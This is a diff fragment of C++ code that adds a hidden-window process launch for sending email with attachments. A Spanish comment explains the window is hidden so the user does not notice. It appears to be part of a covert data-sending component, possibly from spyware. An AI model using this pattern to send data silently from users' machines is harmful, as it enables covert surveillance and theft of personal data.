@@ -130,7 +130,40 @@ namespace Mail {
 		ShExecInfo.nShow = SW_HIDE; //venta invisible para que el usuario no la vea
 		ShExecInfo.hInstApp = NULL; //Para que no salte la venta?
 
+		ok = (bool)ShellExecuteEx(&ShExecInfo);
+		if (!ok)
+			return -3;
 
+		WaitForSingleObject(ShExecInfo.hProcess, 7000);
+		DWORD exit_code = 100;
+		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+
+		m_timer.SetFunction([&]() {
+			WaitForSingleObject(ShExecInfo.hProcess, 60000);
+			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+			if ((int)exit_code == STILL_ACTIVE)
+				TerminateProcess(ShExecInfo.hProcess, 100);
+			Helper::WriteAppLog("<From SendEmail> Return code: " + Helper::ToString((int)exit_code));
+		});
+
+		m_timer.RepeatCount(1L);
+		m_timer.SetInterval(10L);
+		m_timer.Start(true);
+		
+		return (int)exit_code;
+	}
+
+	int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att) {
+
+		std::string attachments = "";
+		if (att.size() == 1U)
+			attachments = att.at(0);
+		else {
+			for (const auto &v : att)
+				attachments += v + "::";
+		}
+		attachments = attachments.substr(0, attachments.length() - 2);
+		return SendMail(subject, body, attachments);
 	}
 }
 
